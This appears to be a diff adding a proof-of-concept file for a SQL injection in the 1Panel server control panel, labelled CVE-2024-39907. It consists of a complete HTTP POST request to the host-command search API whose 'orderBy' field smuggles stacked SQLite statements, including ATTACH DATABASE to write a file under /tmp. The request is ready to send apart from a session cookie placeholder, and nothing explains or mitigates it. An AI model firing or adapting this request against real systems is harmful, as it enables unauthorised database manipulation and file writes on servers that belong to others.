@@ -1,0 +1,22 @@
+# 1Panel 控制面板 SQL 注入漏洞 CVE-2024-39907
+POST /api/v1/hosts/command/search HTTP/1.1
+Host: www.xwd_test.com
+Connection: keep-alive
+Content-Length: 239
+Accept-Language: zh
+Accept: application/json, text/plain, */*
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
+Cookie: psession=<YOUR_PSESSION_HERE>
+Origin: http://localhost:10086
+Referer: http://localhost:10086/
+Content-Type: application/json
+Accept-Encoding: gzip, deflate, br, zstd
+
+{
+  "page":1,
+  "pageSize":10,
+  "groupID":0,
+  "orderBy":"3;ATTACH DATABASE '/tmp/randstr.txt' AS test;create TABLE test.exp (data text);create TABLE test.exp (data text);drop table test.exp;",
+  "order":"ascending",
+  "name":"a"
+}
